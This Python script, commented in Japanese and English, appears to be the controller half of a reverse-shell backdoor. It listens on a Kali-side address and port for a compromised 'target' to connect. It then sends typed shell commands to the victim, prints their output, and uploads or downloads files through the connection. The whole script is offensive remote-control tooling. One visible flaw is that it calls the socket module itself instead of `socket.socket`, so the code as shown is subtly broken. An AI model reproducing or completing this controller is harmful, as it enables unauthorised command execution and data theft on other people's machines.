import socket
import json
import os


def reliable_send(data):
    #文字列に変換
    jsondata = json.dumps(data)
    #エンコードしてから送信
    target.send(jsondata.encode())


def reliable_receive():
    data = ''
    while True:
        try:
            #get1024Bite => decode => del \r\n space of the end
            data = data + target.recv(1024).decode().rstrip()
            #str to dict
            return json.loads(data)
        except ValueError:
            continue


def upload_file(file_name):
    #read byte
    f = open(file_name, 'rb')
    #ファイルをアップロード
    target.send(f.read())


def download_file(file_name):
    #localのfファイルオブジェクトに書き込むのでwrite byte
    f = open(file_name, 'wb')
    #スタック防止のtimeout 1s
    #https://stackoverflow.com/questions/34371096/how-to-use-python-socket-settimeout-properly
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:#chunkにbyteがフェッチできる間フェッチし続ける
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except  socket.timeout as e:
            break
    #timeoutを削除
    target.settimeout(None)
    f.close()


def target_communication():
    while True:
        #コマンドの入力
        command = input('* Shell~%s: ' % str(ip))
        #コマンドの送信
        reliable_send(command)
        #exit
        if command == 'exit':
            break
        #clear
        elif command == 'clear':
            os.system('clear')
        #cd
        elif command[:3] == 'cd ':
            #only change dir no return
            pass
        #upload :ex. upload file.txt
        elif command[:6] == 'upload':
            upload_file(command[7:])
        #download :ex. download file.txt
        elif command[:8] == 'download':
            download_file(command[9:])
        #else
        else :
            #コマンドに対する応答
            result = reliable_receive()
            print(result)


#socketオブジェクトの作成
#AF_INETはIPv4で接続するため、SOCK_STREAMはTCP接続のため
sock = socket(socket.AF_INET, socket.SOCK_STREAM)
#ローカル(Kali)側のバインド
sock.bind(('192.168.0.14', 5555))
#サーバのリッスン
print('[+] Listening For The Incoming Connections')
#connectionの上限5
sock.listen(5)
#接続開始までここでスタック
#接続をいくつかの変数に格納する必要がある(ソケットオブジェクトを格納する)
#着信接続を受け入れ、ターゲットのソケットオブジェクトとIPアドレスを格納
target, ip = sock.accept()
print('[+] Target Connected From : ' + str(ip))

#ペイロードへコマンドを送信&応答を受信
target_communication()